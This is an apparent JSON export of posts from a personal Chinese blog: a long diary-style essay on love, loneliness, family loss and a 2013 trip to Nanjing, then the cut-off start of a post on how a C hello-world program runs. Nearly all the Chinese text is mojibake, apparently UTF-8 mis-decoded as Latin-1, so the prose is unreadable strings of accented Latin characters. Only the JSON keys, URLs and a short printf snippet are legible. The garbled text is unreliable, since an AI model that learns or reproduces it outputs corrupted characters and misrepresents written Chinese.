åˆ†äº«ï¼Œæœ€è‡ªæˆ‘çš„å­˜åœ¨ï¼Œæœ€é‡è¦çš„ç§˜å¯†ã€‚ è„‘æµ·é‡Œå­˜åœ¨è¿‡å¥½å¤šä¸ªæ•…äº‹å¤§å¤šåŒ…å«äº†æˆ‘çˆ±ä½ çš„ä¸»é¢˜ å®ƒä»¬å¯èƒ½åœ¨æˆ‘æƒ³ä½ çš„æŸäº›é¡»è‡¾å‘ç”Ÿäº† ç„¶åæ¶ˆå¤±åœ¨æˆ‘æ— æ³•è¯´å¿˜è®°çš„æ·±æ·±è‡ªè´£é‡Œ å¶å°”ä¼šè®°å½•ä¸‹çš„éƒ½æ˜¯å¯ä»¥ç”¨è¨€è¯­æ¦‚è®ºçš„ åœ¨æˆ‘è§‰å¾—å®åœ¨æ˜¯å­¤å•äº†å–” è¯´ä¸ é™¤äº†ä½ æˆ‘çš„çˆ±äººä»¬å¬","text":"ä¸ä½ åˆ†äº«ï¼Œæœ€è‡ªæˆ‘çš„å­˜åœ¨ï¼Œæœ€é‡è¦çš„ç§˜å¯†ã€‚ è„‘æµ·é‡Œå­˜åœ¨è¿‡å¥½å¤šä¸ªæ•…äº‹å¤§å¤šåŒ…å«äº†æˆ‘çˆ±ä½ çš„ä¸»é¢˜ å®ƒä»¬å¯èƒ½åœ¨æˆ‘æƒ³ä½ çš„æŸäº›é¡»è‡¾å‘ç”Ÿäº† ç„¶åæ¶ˆå¤±åœ¨æˆ‘æ— æ³•è¯´å¿˜è®°çš„æ·±æ·±è‡ªè´£é‡Œ å¶å°”ä¼šè®°å½•ä¸‹çš„éƒ½æ˜¯å¯ä»¥ç”¨è¨€è¯­æ¦‚è®ºçš„ åœ¨æˆ‘è§‰å¾—å®åœ¨æ˜¯å­¤å•äº†å–” è¯´ä¸ é™¤äº†ä½ æˆ‘çš„çˆ±äººä»¬å¬ æˆ‘è¿˜æ˜¯å–œæ¬¢å’Œä½ é¢å¯¹é¢äº¤è°ˆ ååœ¨ç›¸åŒçš„æ—¶é—´å’Œç©ºé—´é‡Œ å¯¹ä½ æ„Ÿåˆ°æ— è¯­çš„æ—¶å€™å°±çœŸçš„ä¸å‘ä¸€è¨€ ä½ å¯¹æˆ‘å¿ƒå­˜æ€€ç–‘çš„æ—¶å€™å¯ä»¥çœ‹ç€æˆ‘çš„çœ¼ç› ä»–ä¼šå‘Šè¯‰ä½ æˆ‘æ˜¯ä¸ªå¥½äººä»¥åŠä¸æ„¿è¯´å‡ºå£çš„æˆ‘çˆ±ä½  å–œæ¬¢é™Œç”Ÿçš„è¡—åŒº æ— çŸ¥çš„äººè¡Œé“ é£å¸¦è¿‡æ¥çš„éƒ½æ˜¯é‚£äº›æ— çŸ¥äººçš„æ°”å‘³å„¿ ä½ æ•¢ä¿¡ä¹ˆ èµ°åœ¨æ‹¥æŒ¤çš„äººæ½®ä¸­æˆ‘åè€Œå®‰å¿ƒ é‚£äº›ç»“ä¼´çš„éª‘è¡Œè€…ä»–ä»¬çš„æ¬¢é¢œ é£å°˜ä»†ä»†çš„èµ¶è·¯äºº æ¨ç€å©´å„¿è½¦çš„å¹´è½»æ¯äº² æˆ‘ä¼¼ä¹è§è¿‡æ— æ•°æ¬¡è¿™æ ·çš„é¢å­” ä»–ä»¬å¥½åƒå‘ç”Ÿç€åŒæ ·çš„æ•…äº‹ ç„¶è€Œç”Ÿæ´»æœ¬å°±æ˜¯å¦‚æ­¤ åƒç¯‡ä¸€å¾‹ é‚£äº›ä¸ªå­¦ç”»çš„æ—¥å­é‡Œ å…´å¥‹å¤±è½éª„å‚²è¿·èŒ«å“­æ³£ æœ‰ä½  æœ‰å¥¹ä»¬æœ‰é’æ˜¥ æƒ³æ¥éƒ½æ˜¯æ— æ¯”çè´µ ç»†æ•°ä¸å°½çš„ è¿™ä¸ªä¸–ç•Œä¸Š æˆ‘æœ€ç•æƒ§çš„å°±æ˜¯æ—¶é—´äº† é‚£ä¸ªå‚»ç“œé˜¿ â€œæ˜å¹´æˆ‘è¦å¸¦ç€ä¸€å¤§æŸç«ç‘°èŠ±å»å†›é˜Ÿâ€ å¥¹å–Šæˆ‘çš„åå­— è¯´â€œæˆ‘å†³å®šäº†â€ æˆ‘ä»¬ç»å¸¸éƒ‘é‡å…¶äº‹åœ°åšä¸€äº›å†³å®š ç„¶è€Œæˆ‘è¿˜æ˜¯è¢«ç‚¹ç‡ƒäº† æˆ‘å¹»æƒ³å¹¸ç¦çš„åœºæ™¯ç¾å¥½çš„ç»“å±€ æˆ‘å“­ç€æ‹¥æŠ±å¥¹è¯´â€œä¸ºä½ é«˜å…´â€ å¥¹è½»æ‹ç€æˆ‘çš„åèƒŒ åœ¨æˆ‘è€³è¾¹è¯´â€œä½ ä¹Ÿä¼šç­‰åˆ°è¿™ä¸€å¤©çš„ã€‚â€ è¿˜å¸¦ç€æŠŠæ¡ä½äº†å¹¸ç¦çš„å¥³å­©åº”è¯¥æœ‰çš„æ²‰ç¨³è¯­è°ƒ æ—©ä¸Šè‡ªç„¶é†’ æƒ³åˆ°è¿åŠ¨ä¼šé‚£å¤© ä½ æŠŠé£ŸæŒ‡è´´è¿‘å˜´å”‡ä½œå‡ºå˜˜çš„åŠ¨ä½œ è„¸ä¸Šè¿˜æŒ‚ç€è°ˆè¯æ—¶çš„ç¬‘æ„ æ ·å­ç‰¹åˆ«å¥½çœ‹ ç„¶åå°±çœ‹åˆ°ä½ ä»¬çš„å®ä¹ è€å¸ˆèµ°äº†è¿‡æ¥ è·³è¿œç»“æŸçš„æ—¶å€™ ä½ å±é¢ å±é¢ è·‘å›æ¥ ä¸€è„¸å…´å¥‹è¯´ç€åˆšå¦‚ä½•æ‘”æƒ¨äº†ä¸¢äººäº† æ ·å­ç‰¹åˆ«å¯çˆ± å¯ä¸å¯ä»¥å€Ÿæˆ‘ä¸€ä¸ªâ€œä»æ­¤â€ æˆ‘çš„æ•…äº‹è¯¥å®Œç»“äº† ä½†æ˜¯ å®‰å¾’ç”Ÿå…ˆç”Ÿå·²ç»æŠŠæœ€åä¸€ä¸ªâ€œä»æ­¤â€ä¹Ÿç”¨æ‰äº† è¦ä¸ä½ è¯•è¯•çœ‹æˆ‘çš„â€œåæ¥â€â€œä»¥åâ€â€œæœ€åâ€æˆ–è€…â€œç„¶åâ€ ä¸äº†ï¼Œ çœ‹æ¥æˆ‘åªèƒ½è®©æˆ‘çš„ç‹å­å’Œå…¬ä¸»æ­»æ‰äº† æˆ‘æœ‰æ—¶ä¼šå¯¹è‡ªå·±è¯´ï¼Œå†™ä¸ªæ•…äº‹å§ã€‚ç”Ÿæ´»è¿™ä¹ˆæ— è¶£ï¼Œéšä¾¿å†™ä¸ªå¼€å¤´ç»“å°¾ï¼Œå°±èƒ½æ‰“åŠ¨äººã€‚åæ¥å¾€å¾€æ— æœï¼Œå› ä¸ºç”Ÿæ´»é¢å­”å¤šï¼Œç”Ÿæ´»å…¶å®æ¯”æ•…äº‹å‰å®³ï¼Œè§‰å¾—ç”Ÿæ´»æ— èŠå°±å†™ä¸å‡ºå¥½çœ‹çš„æ•…äº‹ã€‚äººä¸ºä»€ä¹ˆä¼šè§‰å¾—æ— èŠï¼Œäººä»¬æ€»è¯´ï¼Œä»Šå¤©ç®€ç›´æ— èŠå¾—è¦æ­»ï¼Œè¿™å¥è¯å…¶å®ä¸€ç‚¹ä¹Ÿä¸å¤¸å¼ å•Šã€‚æœ‰äººä¼šé€‰æ‹©æ­»äº¡ï¼Œè¦ä¹ˆå› ä¸ºæ‡¦å¼±ï¼Œä»–ä»¬æ˜¯è¢«å›°éš¾æ‰“è´¥äº†ï¼›è¦ä¹ˆå°±æ˜¯æ— èŠæ•™å”†çš„ï¼Œä»–ä»¬æ— æ‰€æ‹äº†ã€‚æˆ‘æ˜¾ç„¶è¿˜æ˜¯æœ‰æ‰€æ‹çš„ï¼Œ å°±ç®—å•æ‹ä¸€ä¸ªäººæˆ‘ä¹ŸæŒç»­äº†å¤Ÿä¹…ã€‚æˆ‘è¿˜æ˜¯ä¹æ„å»ç¼–ç»‡ä¸€äº›ä¹±ä¸ƒå…«ç³Ÿçš„ä¸œè¥¿ï¼Œæˆ–è®°å½•æŸäº›çœŸå® ç»™ä»¥åã€‚æ„Ÿåˆ°æ— èŠçš„æ—¶å€™ï¼Œå°±ä¼šæŠŠæ—¶é—´å¥‰ç»™æƒ³å¿µã€‚ç¦»ä¸–çš„é•¿è¾ˆï¼Œè®¸ä¹…æœªè§çš„æœ‹å‹ï¼Œä¸çŸ¥å»å‘çš„æ•…äººï¼Œä¸æ›¾ç›¸æ‹çš„æ‹äººã€‚è¿æ°”ä¸é”™çš„è¯ï¼Œè¿‡ç¨‹ä¸­å°±èƒ½æ”¶è·çµæ„Ÿã€‚æ½œæ„è¯†é‡Œé‚£äº›æƒ³è¯´çš„è¯ï¼Œä¼šåœ¨ä¸€ç¬é—´ï¼Œè‡ªå·±å°±æ’åˆ—ç»„åˆå°è·‘è€Œæ¥ã€‚ é‚£å¥³äººæŒ‰ç…§æƒ¯ä¾‹ï¼Œåœ¨æ˜ŸæœŸä¸€çš„æ—©æ™¨ï¼Œåˆå¼€å§‹æ•°è½èµ·å¥¹å¯æ€œçš„ä¸ˆå¤«ã€‚â€œæˆ‘çœŸæ˜¯å—å¤Ÿäº†ï¼Œçœ‹çœ‹ä½ æ²¡å‡ºæ¯çš„æ ·å­ã€‚â€å¥¹å…ˆæ˜¯é‡å¤äº†ä¸Šå‘¨ä»¥åŠä¸Šä¸Šå‘¨ä»¥åŠä¸Šä¸Šä¸Šå‘¨çš„å¼€åœºç™½ã€‚ä»–çš„ä¸ˆå¤«æ²‰é»˜ä¸è¯­ï¼Œæˆ–è®¸æ²¡å¬åˆ°ï¼Œå› ä¸ºä»–æ­£ â€œè®°å¾—æŠŠç‰›å¥¶å–æ‰ï¼Œå–å®Œè®°å¾—æŠŠæ¯å­æ´—å¹²å‡€ã€‚æˆ‘å»ä¸Šç­äº†ï¼Œè¿™æ—¥å­ç®€ç›´æ²¡æ³•è¿‡äº†ã€‚â€ç»“æŸè¯­ä¹Ÿä¸€æ ·ã€‚ èƒ½éšç€æ€§å­ï¼Œæœ€ç»ˆå®Œæˆä¸€ä»¶äº‹ã€‚ä¾¿ååˆ†ç¾å¥½ã€‚ æœé—»é“ï¼Œå¤•æ­»å¯çŸ£ã€‚äººä»¬æƒ³è¦å¼ºè°ƒæŸä»¶äº‹æ—¶ï¼Œæ€»ä¼šæŠŠè¯è¯´å¾—æå…¶å¤¸å¼ ã€‚ ç›¸å¯¹è€æ— æ‰€ä¾è¿™æ ·æ•…å¼„ç„è™šçš„ç”µå½±ï¼Œè¿˜æ˜¯æ›´å–œæ¬¢å¬åˆ«äººå®å®åœ¨åœ¨è®²æ•…äº‹ã€‚æ¯”å¦‚ä¸€æ¬¡åˆ«ç¦»ï¼Œæ¯”å¦‚é€šå¤©å¡”ã€‚å®ƒä»¬é¦–å…ˆæ˜¯æƒ³å¥½å¥½è®²ä¸€ä¸ªå¥½æ•…äº‹ï¼Œè€Œåå¸Œæœ›å‘äººæ·±çœäº§ç”Ÿè®¨è®ºã€‚å®ƒä»¬è®²ç¤¼è²Œï¼Œæ˜¯ç‰¹åˆ«æœ‰è¯šæ„çš„è¯‰è¯´è€…ã€‚ æˆ‘ä»¬æ˜¯åŠ¨ç‰©å­¤ç‹¬åœ°è¿‡å†¬æ˜¥å¤©æ¥äº†æˆ‘æŠŠè‡ªå·±æ»šæˆä¸€ä¸ªçƒæ²¿è·¯æ‘˜å‡ é¢—æ–°é²œçš„é…±æœèµ¶åˆ°ä½ å®¶é—¨å£ç­‰å¾…ä½ æ…¢æ…¢è‹é†’çš„æ ·å­ä½ æ‰‘è…¾äº†å‡ ä¸‹å¼ å¼€äº†ç¿…è†€çœ‹åˆ°ååœ¨æ ‘ä¸‹çš„æˆ‘ä½ é«˜å…´åœ°ä¿¯å†²ä¸‹æ¥å¼èµ°äº†æˆ‘èƒŒä¸Šçš„ç´«è‰²é…±æœç„¶åé£èµ°äº†æˆ‘æ‹¾èµ·ä½ æ‰è½çš„ç¾½æ¯›å¦‚è·çå® å›å¿†å¾€å¸¸æ—¥å­é‡Œæ‰€æœ‰ä¸ä½ çš„å¯¹è§† å¤å°”èµ°äº†ä¹‹åæ¯ä¸ªæ˜ŸæœŸéƒ½ä¼šå»é•‡ä¸Šå–é…’æœ€è¿‘å»å¾—æ¯”è¾ƒé¢‘ç¹æˆ‘çˆ±ä¸Šäº†ä¸€ä¸ªå§‘å¨˜æ¯å¤©ä¸‹åˆä¸‰ç‚¹å¥¹ä¼šæ¨ç€å°æ¨è½¦æ¥ç»™é…’é¦†é€é…’ä¸€ä¸ªæœˆè¿‡å»å¤å°”è¿˜æ²¡æœ‰å›æ¥æˆ‘å¸¦å§‘å¨˜å›å®¶å¥¹è‡ªå·±è„±è¡£æœç„¶åæ´—æ¾¡åœ¨åšç¬¬ä¸‰æ¬¡çš„æ—¶å€™å¥¹è¯´æˆ‘çŸ¥é“ä½ ä¸çˆ±æˆ‘ä½ åªä¸è¿‡æƒ³è®²ä¸€ä¸ªæ•…äº‹ ä½ è¿ä¸€æŠŠå¥½å‰‘éƒ½æ²¡æœ‰ä½ ä¹Ÿå¥½æ„æ€è¯´è‡ªå·±æ˜¯è¡Œä¾ ä»—ä¹‰çš„æ±Ÿæ¹–ä¸­äººé‚£ä¸ªå…œé‡Œä¸è¿‡æ£äº†å‡ æŠŠå°åˆ€çš„å·å·å¤´ç«Ÿä¹Ÿå˜²ç¬‘æˆ‘å½“æ—¶æˆ‘ä¹Ÿæ˜¯å¹´è½»æ°”ç››å†²ä¸Šå»å‡ æ‹³æŠŠä»–æ‰“å€’åœ¨åœ°çœ¼çœ‹ä»–ä¸€è„¸è¡€æˆ‘æ¥ç€ç”¨åŠ›è¡¥äº†å‡ è„šå°±æ‰¬é•¿è€Œå»éšçº¦å¬åˆ°å›´è§‚çš„äººç¾¤ä¸­ä¼ æ¥å£°éŸ³å°æå°æä½ æ²¡äº‹å§æˆ‘é¡¾è‡ªå‘å‰ å¥¹çªç„¶è¯´â€œæˆ‘å¦ˆå¦ˆæ˜¯åœ¨é…‰æ—¶ç”Ÿä¸‹æˆ‘çš„ï¼Œæ—¥è½é…‰æ—¶ï¼Œè®°ä½å•¦ï¼Œæˆ‘æ­»äº†ä½ è¦å‘Šè¯‰é“å£«å…ˆç”Ÿå‘€â€â€œæ—¥è½æœ‰æ—¶ï¼Ÿå°±åƒç°åœ¨å¤ªé˜³è¦ä¸‹å±±äº†å—ï¼Ÿâ€â€œæ©ï¼Œå°±æ˜¯å‚æ™šäº†ï¼Œå¥½å¥½è®°ä½ï¼Œä»–ä»¬éƒ½ä¸çŸ¥é“ï¼Œæˆ‘ä»¬å®¶æ€»è¦æœ‰ä¸€ä¸ªäººçŸ¥é“ã€‚â€æˆ‘çªç„¶æ˜ç™½è¿™ä»¶äº‹æ˜¯éå¸¸ç¥åœ£çš„ï¼Œé‚£å¹´æˆ‘å…­ä¸ƒå²ï¼Œå¥¹åªå‘Šè¯‰æˆ‘ä¸€ä¸ªäººã€‚å°±åœ¨å‡ å¹´å‰å¥¹ç¦»å¼€ã€‚éå¸¸çªç„¶ï¼Œæˆ‘ä»¬æ¯ä¸ªäººéƒ½å¼€å§‹è‡ªè´£ã€‚å¥¹ç¦»å¼€ä¹‹å‰ï¼Œå®¶é‡Œè¿˜åœ¨å•†é‡å¥¹çš„99å²å¤§å¯¿ã€‚å‡ºæ®¡é‚£å¤©ï¼Œæˆ‘å’Œå§‘å§‘è¿˜æœ‰å¦å¤–å‡ ä¸ªäººåä¸€è¾†è½¦ï¼Œæœ‰ä¸ªå¥³äººä¸€ç›´å¤§å£°è¯´ç¬‘ï¼Œåµåµé—¹é—¹ã€‚æˆ‘æƒ³æŠ½å¥¹ä¸€è€³å…‰ã€‚æˆ‘çœ‹ç€çª—å¤–ï¼Œå§‘å§‘æ‚ç€æˆ‘ã€‚ä¸€ç›´ä¸‹ç€å°é›¨ã€‚ å°æ—¶å€™ç¬¬ä¸€æ¬¡åœ¨æˆ·å£ç°¿ä¸Šçœ‹åˆ°å¥¹çš„åå­—æˆ‘å˜²ç¬‘å¥¹è¯´è°ç»™ä½ å–çš„åå­—å•Šå¼ å¤§å§ ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡çŸ¥é“å¥¹ä¸å§“æ¨è€Œæ˜¯å§“å¼  é€šå¸¸æˆ‘ä»¬ååœ¨ä¸€èµ·çš„æ—¶å€™æˆ‘ä¸å¤§è®°å¾—æ˜¯è°å…ˆå¼€å£è¯´ç¬¬ä¸€å¥è¯ ååœ¨é‚£é‡ŒæŠ½çƒŸçš„ç”·äººå¤–å¥—æ­ªèººåœ¨æ²™å‘ä¸Šå¢™è„šç«‹ç€ä¸€ç›†ç»¿æ¤ï¼Œå¶å­å¤§è€ŒèŒ‚ç››å¥³äººä¸çŸ¥å»äº†å“ªé‡Œï¼Œèœæ‘†åœ¨æ¡Œä¸Šæ…¢æ…¢å‡‰ä»çª—å¤–é£æ¥ä¸€åªé¸Ÿï¼Œæ¨ªå†²ç›´æ’ç”·äººç†„ç­äº†åŠæ”¯çš„çƒŸï¼Œèººåœ¨æ²™å‘ä¸Šå¤–å¥—å‹åœ¨èº«ä¸‹ï¼Œéœ²å‡ºåŠåªè¢–é¸Ÿå„¿é£æ¥é£å»ä¸è§‰å¾—ç´¯æ±¤é¢ä¸Šç»“èµ·ä¸€å±‚æ²¹èŠ±ï¼Œå¥³äººæ²¡æœ‰å›æ¥è€Œå¢™è§’ç«‹ç€ä¸€ç›†ç»¿æ¤é¸Ÿå„¿æ¨ªå†²ç›´æ’ å’Œè–‡èŠäº†å¥½å¤šï¼Œäº”å¹´å†…å‡ ä¹æ²¡æœ‰è”ç³»ï¼Œæˆ‘ç»™å¥¹è®²ç°åœ¨çš„è‡ªå·±ï¼ŒçŒ›ç„¶å‘ç°æ›¾ç»æœ€çˆ±åšçš„äº‹æƒ…ç°åœ¨ä¾ç„¶ï¼Œå†™å­—ç”»ç”»å–œæ¬¢kimiã€‚ä½ å˜äº†ä¹ˆ 2013.12.16 æ­å·ä¸‹é›ªäº†å’Œä½ ç”Ÿæ´»åœ¨åŒä¸€åº§åŸå¸‚çš„å¥½å¤„æ˜¯ æ„Ÿå— åŒæ ·çš„å¤©æ°”ä¸¤ç‚¹é’Ÿçš„æ—¶å€™ å„è‡ªå‘æ¡çŠ¶æ€è¿æ¥å­£èŠ‚èµ äºˆçš„ç¤¼ç‰© æ˜¯çš„ä¸‹é›ªäº†è¿‡å»å‡ å¤©çš„é›¾éœ¾ ä¼¼ä¹å¯¹æˆ‘æ²¡ä»€ä¹ˆå½±å“å¥½åƒäº‹ä¸å…³å·±æ—©ä¸Šä¸‹é›¨ å†· æ’‘ä¸€æŠŠå¤§å¤§çš„ æ£çº¢è‰²çš„ä¼ä¸‹åˆååœ¨å¯å®¤çœ‹éè¯šå‹¿æ‰° çª—å¤– é›ªå¾ˆå¤§è¶…ç¾çš„ ä¸ºä»€ä¹ˆåœ¨åšäº‹æƒ…ä¹‹å‰ï¼Œæˆ‘ä¸å‘Šè¯‰è‡ªå·±ï¼Œä¸€å®šè¦åšåˆ°æœ€å¥½ï¼Œè¦å°½åˆ°æœ€å¤§çš„åŠªåŠ›å»å®Œæˆã€‚ä»¥å‰æ€»çˆ±é¡ºå…¶è‡ªç„¶ã€‚æˆ‘å¯¹è‡ªå·±ä¸€ç›´å¾ˆå®¢æ°”ï¼Œæ‰€ä»¥æˆ‘å˜æˆç‰¹åˆ«å®¹æ˜“æ»¡è¶³çš„äººï¼Œå¯¹åˆ«äººä¹Ÿå®Œå…¨æ²¡æœ‰æ€ä¼¤åŠ›ã€‚å¯èƒ½å¿«ä¹è‡³ä¸Šå§ã€‚å¤±ä¹‹å¦ç„¶ï¼Œå¾—ä¹‹æ·¡ç„¶ï¼Œå¤„ä¹‹æ³°ç„¶ï¼Œé¡ºå…¶è‡ªç„¶ã€‚å¹¶ä¸å»ç»™ä¸€ä¸ªå¯¹é”™çš„åˆ¤æ–­ï¼Œå¿«ä¹å°±å¥½ã€‚æœ€ç»ˆä¿¡ä»°æ˜¯ï¼šæ°¸è¿œå¿ äºè‡ªå·±ã€‚ ä»¥å‰æœ‰æ„¿æœ›å†™æ•…äº‹ï¼Œä»¥ä¸ºèƒ½åƒæˆ‘åšå…¶ä»–äº‹æƒ…ä¸€æ ·é¡ºå…¶è‡ªç„¶ï¼Œæ²¡æœ‰æçº²å°±è¿™ä¹ˆä¸€å‘³åœ°å†™ï¼Œéš”åŠå¹´æƒ³å†æ¥ä¸‹å»ï¼Œå´å‘ç°ä¸èƒ½åƒå½“åˆä¸€æ ·éšå¿ƒæ‰€æ¬²äº†ã€‚å½“æœ‰æ— æ•°ç§å¯èƒ½æ‘†åœ¨ä½ é¢å‰çš„æ—¶å€™ï¼Œä½ éƒ½ä¸çŸ¥é“è¯¥å¦‚ä½•èµ°å‘å½“åˆè®¾å®šå¥½çš„ç»“å±€ã€‚ æˆ‘å–œæ¬¢åœ¨å®¶é‡Œè½¬åœˆåœˆï¼Œè¿™æ ·å¯ä»¥å¸¦åŠ¨æ€è€ƒã€‚é¢(âŠ™oâŠ™)â€¦ï¼Œå¥½å§ï¼Œæˆ‘æ‰¿è®¤æˆ‘ç»™æˆ‘çš„æ€ªç™–æ‰¾äº†ä¸€ä¸ªå† å†•å ‚çš‡çš„å€Ÿå£ã€‚ å°æ—¶å€™æœ‰æš´åŠ›å€¾å‘ã€‚æœ‰æ—¶è®¤ä¸ºè‡ªå·±æ˜¯ä¸ªè‡ªé—­ç—‡æ‚£è€…ã€‚ å¤§æ¦‚åä¸€å²çš„æ—¶å€™æˆ‘å¼€å§‹æ‡‚å¾—æ„å»ºè‡ªå·±çš„ç²¾ç¥ä¸–ç•Œï¼Œåæ¥å¼€å§‹æ‚£å¾—æ‚£å¤±ï¼Œæ…¢æ…¢çš„ï¼Œä¼šæŠŠè‡ªå·±çš„æƒ…ç»ªæ”¾å¤§åŒ–ï¼Œå–œæ¬¢çš„äººå’Œäº‹ç‰©ä¼šå°¤å…¶å–œæ¬¢ï¼Œè€Œä¸”æŒä¹…ã€‚ ä¸€ç”Ÿä¸­æˆ‘ä»¬ä¼šé‡åˆ°å½¢å½¢è‰²è‰²çš„äººï¼Œå…¥è€³è®¸è®¸å¤šå¤šçš„äº‹ï¼Œæ— è®ºä½ æ˜¯å¦ä¸»åŠ¨æ­è®ªè¿™ä¸ªä¸–ç•Œï¼Œä¸–ç•Œæ€»èƒ½å¸¦ç»™æˆ‘ä»¬æ”¹å˜ã€‚2013å¹´å¤å¤©ï¼Œæˆ‘åœ¨å—äº¬ã€‚è¿™æ®µæ—…ç¨‹è“„è°‹å·²ä¹…ã€‚å…¶ç„¶å®è·µèµ·æ¥ä¹Ÿå¹¶ä¸éš¾ï¼Œæˆ‘ä»¬ç”šè‡³è¿è½¦ç¥¨éƒ½æ²¡æœ‰æå‰ä¹°å¥½ï¼ŒèƒŒç€åŒ…çº¦å®šåœ¨è½¦ç«™è§é¢ã€‚è¡Œæç®€å•ï¼Œæ‹–ç€ä¸€åŒæ´æ´é‹ï¼Œè§é¢æ˜¯ä¸€ä¸ªä¸é™Œç”Ÿçš„æ‹¥æŠ±ã€‚å¥¹è¯´çš„ç¬¬ä¸€å¥è¯æ˜¯ï¼Œå¥½æƒ³ä½ å•Šã€‚æˆ‘è¯´çš„æ˜¯ï¼Œå¥½çƒ­å•Šã€‚å¼€ç©ç¬‘çš„ï¼Œä½ çŸ¥é“æˆ‘æ˜¯å¦‚æ­¤çˆ±ä½ ã€‚æˆ‘ç›¸ä¿¡é‚£äº›ç‹¬è‡ªæ—…è¡Œçš„äººéƒ½æ˜¯å› ä¸ºæ‰¾ä¸åˆ°åˆé€‚çš„ä¼´ä¾£ã€‚é‚£ä¸ªç™½å¤©æˆ‘ä»¬åœ¨å›¾ä¹¦é¦†å¾…åˆ°é—­é¦†ï¼Œç„¶ååç€æ—§å·´å£«ç©¿è¶Šäº†é•¿å…´è¿™åº§å°åŸï¼Œä»åŒ—åˆ°å—ã€‚æ·±å¤œåƒäº†å¹²æŒ‘é¢ï¼Œååœ¨é©¬è·¯è¾¹ã€‚å·®ä¸å¤šæ˜¯å‡Œæ™¨å››ç‚¹çš„æ—¶å€™ï¼Œæˆ‘ä»¬åä¸Šäº†å¼€å¾€å—äº¬çš„ç«è½¦ã€‚ä»ä¸€å¼€å§‹ï¼Œè¿™æ®µæ—…ç¨‹çš„å®šä¹‰å°±æ˜¯è¦ä¸æ–­ç»™è‡ªå·±æ‰¾éº»çƒ¦ã€‚å…«æœˆä»½ï¼Œå—äº¬ï¼Œå–æ¶ˆé’æ—…é¢„è®¢åºŠä½ï¼Œç«è½¦Â·Â·Â·æ™šä¸Šæˆ‘ä»¬ååœ¨ç§¦æ·®æ²³æ—ï¼Œæœ‰äººå½»å¤œèŠå¤©ï¼Œæœ‰é™Œç”Ÿäººå’Œæˆ‘ä»¬åä¸€æ¡Œï¼Œæ‰°å¾—æˆ‘ä¸å®‰ç¨³ã€‚æœ‰ç‚¹å°é›¨ï¼Œæˆ‘ç¡ç€äº†ï¼Œå¥¹ç»™æˆ‘æ”¯èµ·é›¨ä¼ï¼Œæˆ‘é†’æ¥è§‰å¾—å¥½ç¬‘ã€‚ä¸”è¯´åˆ°è¿™å§ã€‚å€˜è‹¥ä¸¤ä¸ªäººæœ‰å…±åŒçš„è®°å¿†ï¼Œä¸€æä¾¿ä¼šæƒ³èµ·æ¥ã€‚ æ˜¨å¤©çš„å°æ¸…æ–°å’Œä¹‹å‰æ²¡å†™å®Œçš„æ•…äº‹ï¼Œå°±å…ˆä¸åˆ†äº«äº†ã€‚ è¯¥å¿«ä¹å¿«ä¹ï¼Œè¯¥çƒ¦èºçƒ¦èºï¼Œå»ºè®®ä½ å¿«ä¹","categories":[{"name":"å¿ƒæƒ…","slug":"å¿ƒæƒ…","permalink":"http://yubenliu.cn/categories/å¿ƒæƒ…/"}],"tags":[{"name":"å¿ƒæƒ…","slug":"å¿ƒæƒ…","permalink":"http://yubenliu.cn/tags/å¿ƒæƒ…/"},{"name":"éšç¬”","slug":"éšç¬”","permalink":"http://yubenliu.cn/tags/éšç¬”/"}]},{"title":"helloworldç”Ÿå‘½å‘¨æœŸ","slug":"helloword","date":"2019-08-21T06:20:00.000Z","updated":"2019-11-08T10:37:02.854Z","comments":true,"path":"2019/08/21/helloword/","link":"","permalink":"http://yubenliu.cn/2019/08/21/helloword/","excerpt":"åœ¨æˆ‘ä»¬è¦å­¦ä¹ ä¸€é—¨ç¼–ç¨‹è¯­è¨€çš„æ—¶å€™ç¬¬ä¸€ä¸ªç¨‹åºåŸºæœ¬ä¸Šæ˜¯helloworldï¼Œä½†å°±æ˜¯è¿™ä¸ªç®€å•çš„ç¨‹åºåˆ°åº•æ˜¯å¦‚ä½•è¿è¡Œçš„ï¼Œåœ¨æ­¤åšä¸€ä¸‹è®°å½•ã€‚","text":"åœ¨æˆ‘ä»¬è¦å­¦ä¹ ä¸€é—¨ç¼–ç¨‹è¯­è¨€çš„æ—¶å€™ç¬¬ä¸€ä¸ªç¨‹åºåŸºæœ¬ä¸Šæ˜¯helloworldï¼Œä½†å°±æ˜¯è¿™ä¸ªç®€å•çš„ç¨‹åºåˆ°åº•æ˜¯å¦‚ä½•è¿è¡Œçš„ï¼Œåœ¨æ­¤åšä¸€ä¸‹è®°å½•ã€‚ æ–‡ç« ä¸­çš„éƒ¨åˆ†å†…å®¹æ¥è‡ªã€Šæ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿã€‹ç¬¬ä¸€ç« helloworld ä»åˆ°åˆ›å»ºï¼Œæ‰§è¡Œï¼Œè¾“å‡ºç®€å•æ¶ˆæ¯ï¼Œå†åˆ°ç»ˆæ­¢ï¼Œä¸­é—´åˆ°åº•æ˜¯å¦‚ä½•è¿è¡Œçš„ã€‚ç®€å•ä»‹ç»ä¸‹ã€‚ ä»£ç  #include&lt;stdio.h> int main(int argc, char const *argv[]) { printf (\"hello world \\n\"); return 0; } äºŒè¿›åˆ¶æ–‡æœ¬ è®¡ç®—æœºä¸­ï¼Œæ•°æ®çš„å­˜å‚¨æˆ‘ä»¬çœ‹åˆ°çš„æ˜¯ä¸€ä¸²è‹±æ–‡ä»£ç ï¼Œå…¶å®å­˜å‚¨çš„æ˜¯2è¿›åˆ¶æ•°æ®ï¼Œhelloworld ç¨‹åºçš„ä»£ç å¯ä»¥ç”¨ ASCLLç è¡¨ç¤ºã€‚å†æŠŠå…·ä½“çš„ASCLLç è½¬ä¸ºä¸º2è¿›åˆ¶ã€‚ å¦‚å›¾ä¸­çš„23å¯¹åº”çš„10è¿›åˆ¶æ•°æ®ä¸º35 è€Œ35å¯¹åº”çš„ä¸º# ç¨‹åºè¢«å…¶ä»–ç¨‹åºç¿»è¯‘æˆä¸åŒçš„æ ¼å¼helloç¨‹åºä»ä¸€ä¸ªé«˜çº§çš„cç¨‹åºå¼€å§‹å› ä¸ºè¿™æ ·æ›´å®¹æ˜“è®©äººè¯»æ‡‚ã€‚ä½†æ˜¯å¦‚æœè¦è¿è¡Œhelloè¿™ä¸ªç¨‹åºï¼Œå¿…é¡»è¦è½¬ä¸ºç¼–è¯‘æˆæ›´ä½çš„æœºå™¨è¯­è¨€ã€‚ åœ¨Linux ä¸­ä»æºç¨‹åºåˆ°ç›®æ ‡ç¨‹åºæ˜¯ç”±ç¼–è¯‘å™¨å®Œæˆçš„ã€‚ å¯ä»¥ç”¨file å‘½ä»¤æŸ¥çœ‹ç›®æ 